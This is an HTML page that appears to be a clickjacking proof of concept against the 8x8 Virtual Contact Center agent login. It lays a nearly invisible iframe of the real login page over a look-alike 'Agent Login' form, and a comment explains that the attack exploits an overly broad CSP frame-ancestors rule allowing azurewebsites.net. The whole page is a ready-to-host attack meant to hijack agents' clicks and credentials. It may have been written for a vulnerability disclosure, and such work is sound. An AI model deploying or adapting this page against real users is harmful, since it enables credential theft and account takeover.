<!DOCTYPE html>
<html>
<head>
  <title>8x8 Agent Portal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
    .header {
      background: #1a1a2e; color: white; padding: 16px 24px;
      display: flex; align-items: center; gap: 12px;
    }
    .header img { height: 32px; }
    .header h1 { font-size: 18px; font-weight: 500; }
    .container {
      position: relative; width: 800px; margin: 60px auto;
      min-height: 600px;
    }
    .target-frame {
      width: 100%; height: 600px; border: none;
      opacity: 0.0001; position: absolute; top: 0; left: 0; z-index: 2;
    }
    .fake-ui {
      position: relative; z-index: 1;
      background: white; border-radius: 8px; padding: 48px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      max-width: 400px; margin: 0 auto;
    }
    .fake-ui h2 { font-size: 22px; margin-bottom: 8px; color: #1a1a2e; }
    .fake-ui p { color: #666; margin-bottom: 24px; font-size: 14px; }
    .fake-ui label { display: block; font-size: 13px; color: #333; margin-bottom: 4px; font-weight: 500; }
    .fake-ui input {
      width: 100%; padding: 10px 12px; border: 1px solid #ddd;
      border-radius: 6px; font-size: 14px; margin-bottom: 16px;
    }
    .fake-ui button {
      width: 100%; padding: 12px; background: #0066ff; color: white;
      border: none; border-radius: 6px; font-size: 15px; font-weight: 500;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>8x8 Virtual Contact Center</h1>
  </div>
  <div class="container">
    <!-- Transparent iframe loads real VCC login — works because *.azurewebsites.net is in CSP frame-ancestors -->
    <iframe class="target-frame" src="https://vcc-na30.8x8.com/AGUI/login.php"></iframe>
    <!-- Fake UI underneath -->
    <div class="fake-ui">
      <h2>Agent Login</h2>
      <p>Please verify your credentials to continue</p>
      <label>Agent ID</label>
      <input type="text" placeholder="agent@tenant">
      <label>Password</label>
      <input type="password" placeholder="Enter password">
      <button>Sign In</button>
    </div>
  </div>
</body>
</html>
